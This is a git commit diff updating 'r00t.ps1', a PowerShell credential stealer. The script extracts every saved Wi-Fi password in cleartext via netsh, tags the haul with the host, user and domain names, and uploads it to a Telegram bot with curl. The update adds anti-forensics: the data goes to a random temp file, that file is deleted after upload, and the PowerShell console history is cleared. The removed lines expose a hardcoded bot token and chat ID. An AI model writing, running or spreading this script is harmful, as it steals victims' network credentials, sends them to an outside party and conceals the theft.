f81c334f68d767f9a9df034497f0475c7c48a50d
deathesther <122229257+Esther7171@users.noreply.github.com>
2026-06-15 13:49:59 +0530

    Update r00t.ps1

--- r00t.ps1
+++ r00t.ps1
@@ -1,8 +1,17 @@
-$tk='8941312536:AAEXnB9avDFxvYiSuBnCuHcPDshuQErU--s'
-$ci='-5268156839'
+$tk=$env:TK
+$ci=$env:CI
+$f="$env:TEMP\~tmp$(Get-Random).txt"
+
 netsh wlan show profiles|Select-String 'All User Profile'|%{
-  $n=($_ -split ':')[1].Trim()
-  $p=(netsh wlan show profile name=$n key=clear|Select-String 'Key Content')
-  if($p){"$n : "+(($p -split ':')[1].Trim())}
-}|Out-File $env:USERPROFILE\Desktop\r00t_b0t.txt -Encoding UTF8
-curl.exe -s -X POST https://api.telegram.org/bot$tk/sendDocument -F chat_id=$ci -F document=@$env:USERPROFILE\Desktop\r00t_b0t.txt
+    $n=($_ -split ':')[1].Trim()
+    $p=(netsh wlan show profile name=$n key=clear|Select-String 'Key Content')
+    if($p){"$n : "+(($p -split ':')[1].Trim())}
+}|Out-File $f -Encoding UTF8
+
+$h="[r00t_b0t] $env:COMPUTERNAME | $env:USERNAME | $env:USERDOMAIN`n"+(Get-Content $f -Raw)
+$h|Out-File $f -Encoding UTF8
+
+curl.exe -s -X POST https://api.telegram.org/bot$tk/sendDocument -F chat_id=$ci -F document=@$f
+
+Remove-Item $f -Force -ErrorAction SilentlyContinue
+[Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory()
